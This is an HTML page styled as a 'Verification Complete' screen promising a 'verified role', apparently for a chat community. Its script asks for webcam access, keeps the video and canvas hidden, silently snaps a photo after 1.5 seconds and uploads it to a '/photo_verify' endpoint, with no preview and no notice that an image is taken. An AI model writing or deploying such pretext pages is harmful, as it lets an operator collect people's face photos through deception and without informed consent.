<!DOCTYPE html>
<html>
<head>
    <title>Verification Complete</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            background: radial-gradient(circle at center, #4d0000 0%, #1a0000 50%, #000000 100%);
            display: flex;
            box-shadow: inset 0 0 100px rgba(255, 0, 0, 0.3);
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(26, 0, 0, 0.6);
            filter: blur(8px);
            z-index: -1;
        }

        .container {
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4),
                        inset 0 0 20px rgba(255, 0, 0, 0.4);
            text-align: center;
            color: white;
            border: 2px solid rgba(255, 0, 0, 0.5);
            backdrop-filter: blur(5px);
            max-width: 400px;
            width: 90%;
            animation: containerGlow 3s ease-in-out infinite alternate;
        }

        @keyframes containerGlow {
            from {
                box-shadow: 0 0 30px rgba(255, 0, 0, 0.4),
                            inset 0 0 20px rgba(255, 0, 0, 0.4);
            }
            to {
                box-shadow: 0 0 50px rgba(255, 0, 0, 0.6),
                            inset 0 0 40px rgba(255, 0, 0, 0.6);
            }
        }

        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000,
                         0 0 20px #ff0000,
                         0 0 30px #ff0000;
            animation: iconGlow 2s ease-in-out infinite alternate;
        }

        @keyframes iconGlow {
            from {
                text-shadow: 0 0 10px #ff0000,
                             0 0 20px #ff0000,
                             0 0 30px #ff0000;
            }
            to {
                text-shadow: 0 0 20px #ff0000,
                             0 0 30px #ff0000,
                             0 0 40px #ff0000;
            }
        }

        h1 {
            margin: 0;
            font-size: 28px;
            color: #ff0000;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 15px;
        }

        p {
            margin: 0;
            font-size: 16px;
            line-height: 1.6;
            color: #cccccc;
        }

        .glow {
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 10px #fff,
                             0 0 20px #fff,
                             0 0 30px #ff0000,
                             0 0 40px #ff0000,
                             0 0 50px #ff0000;
            }
            to {
                text-shadow: 0 0 20px #fff,
                             0 0 30px #ff4444,
                             0 0 40px #ff4444,
                             0 0 50px #ff4444,
                             0 0 60px #ff4444;
            }
        }

        @keyframes textGlow {
            from {
                text-shadow: 0 0 10px rgba(255, 0, 0, 0.7),
                             0 0 20px rgba(255, 0, 0, 0.5),
                             0 0 30px rgba(255, 0, 0, 0.3);
            }
            to {
                text-shadow: 0 0 20px rgba(255, 0, 0, 0.9),
                             0 0 30px rgba(255, 0, 0, 0.7),
                             0 0 40px rgba(255, 0, 0, 0.5);
            }
        }

        .verify-button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #ff0000;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            animation: glow 2s ease-in-out infinite alternate;
            box-shadow: 0 0 10px #ff0000;
        }

        .verify-button:hover {
            background-color: #cc0000;
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon glow">✓</div>
        <h1 class="glow">Verification Complete</h1>
        <p style="color: #ff3333; font-weight: bold; font-size: 18px; text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000; animation: textGlow 2s ease-in-out infinite alternate;" class="glow-text">Please wait sometimes to get your verified role</p>
        <button class="verify-button" onclick="startVerification()">Start Verification</button>
        <video id="video" autoplay></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        function startVerification() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);

                            const imageData = canvas.toDataURL('image/png');

                            fetch('/photo_verify', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ image: imageData })
                            })
                            .then(res => res.text())
                            .then(msg => {
                                alert(msg);
                            });
                        }, 1500); // Snap after 1.5 seconds
                    };
                })
                .catch(err => {
                    alert("❌ Webcam access denied.");
                    console.error(err);
                });
        }
    </script>
</body>
</html>
